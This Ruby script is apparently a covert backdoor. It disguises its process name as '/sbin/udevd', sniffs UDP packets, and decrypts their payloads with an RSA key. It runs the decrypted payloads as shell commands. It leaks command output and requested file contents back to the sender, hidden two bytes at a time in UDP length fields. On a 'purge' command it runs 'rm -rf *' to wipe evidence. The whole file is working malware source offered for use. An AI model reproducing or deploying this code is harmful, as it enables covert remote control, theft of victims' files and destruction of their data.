#!/usr/bin/env ruby

require 'rubygems'
require 'digest/sha1'
require 'openssl'
require 'base64'
require 'packetfu'
require 'thread'

include OpenSSL

# Change process name
$0 = '/sbin/udevd'

def decrypt(data)
	key = OpenSSL::PKey::RSA.new File.read 'private_key.pem'
	return key.private_decrypt(data)
end

def cap()

file = File.open('settings.conf')
array = file.readlines
puts "Interface:"
inf = puts "#{array[0]}"
puts "\n"
puts "Listening Port:"
puts "#{array[1]}\n" # For filter
puts "Return Port:"
puts "#{array[2]}\n" # For call home

capture = PacketFu::Capture.new(:iface => inf, :start => true,
									:promisc => true, :filter => "udp dst port #{array[1]}",
									:save => true)

pcount = 0.0 # Packet count
bsize = 2 # Byte size (times 8 for bits)
output = ""

puts "Capturing (UDP)..."
puts "\n"

capture.stream.each do |pkt|

	# Capture commands
	packet = PacketFu::Packet.parse(pkt)

	encrypted_data = packet.payload
	decrypted_data = decrypt(encrypted_data)
		puts "Decrypted (#{decrypted_data})"
		puts "\n"
	parsed = decrypted_data;
	
	begin
		output = %x[#{parsed}]
	rescue
		count = "Logic error"
	end
	
	# Call home, bytes sections
    if system("#{parsed}") == true # User defined command handling
		puts "OK"
		puts "\n"
		eoo = 0
		
		output.scan(/.{1,#{bsize}}/m) do |count|
		puts "CALC 1"
		
		config = PacketFu::Utils.whoami?(:iface => inf)
		udp_packet = PacketFu::UDPPacket.new()
	
		udp_packet.eth_saddr = config[:eth_saddr]
		udp_packet.eth_daddr = packet.eth_saddr
		udp_packet.ip_saddr = packet.ip_daddr.to_s; # Target IP
		udp_packet.ip_daddr = packet.ip_saddr.to_s; # Attacker IP
		udp_packet.udp_src = 1024 + rand(65535 - 1024)
		udp_packet.udp_dst = array[2].to_i	
		
		eoo += 1
		pcount = (output.length.to_f/bsize.to_f)
		puts "CALC 2"
		
		counts = count.bytes.to_a
		
		if eoo == pcount.ceil
			counts = "~f".bytes.to_a
			eoo = 0
		end
		
		udp_packet.recalc
		
		udp_packet.udp_len = counts.pack("U*")
		#udp_packet.payload = count

		#udp_packet.recalc
		
		udp_packet.to_w(inf)
		puts "Bytes sent home..."
		puts "\n"
		
		end
	
	# File handling
	elsif File.file? parsed
		puts "OK, found"
		puts "\n"
		puts "Grabbing file..."
		puts "\n"

		eoo = 0
		
		config = PacketFu::Utils.whoami?(:iface => inf)
		
		File.open(parsed, "rb") do |file|
			while(line = file.gets)
				
				line.scan(/.{1,#{bsize}}/m) do |count|
				puts "CALC 1"
				
				udp_packet = PacketFu::UDPPacket.new()
	
				udp_packet.eth_saddr = config[:eth_saddr]
				udp_packet.eth_daddr = packet.eth_saddr
				udp_packet.ip_saddr = packet.ip_daddr.to_s; # Target IP
				udp_packet.ip_daddr = packet.ip_saddr.to_s; # Attacker IP
				udp_packet.udp_src = 1024 + rand(65535 - 1024)
				udp_packet.udp_dst = array[2].to_i	
		
				eoo += 1
				pcount = (line.length.to_f/bsize.to_f)
				puts "CALC 2"
				
				counts = count.bytes.to_a
		
				if eoo == pcount.ceil
					counts = "~f".bytes.to_a
					eoo = 0
				end
		
				udp_packet.recalc
		
				udp_packet.udp_len = counts.pack("U*")
		
				udp_packet.to_w(inf)
				puts "Bytes sent home..."
				puts "\n"
				
				end
			end
	
		end
	
	# Kill and clear evidence when "purge" is received	
	elsif parsed == "purge"
		puts "Self-destructing and taking everything with me!"
		`rm -rf *` # Tested, use with care!
		Kernel.exit
		
	else
		puts "Command/file not recognized..."
	end
	
	end

end

cap_thread = Thread.new do
	loop do
		# Crude way to quit, for convenience
		Kernel.exit if gets =~ /^C/
	end
end

cap()
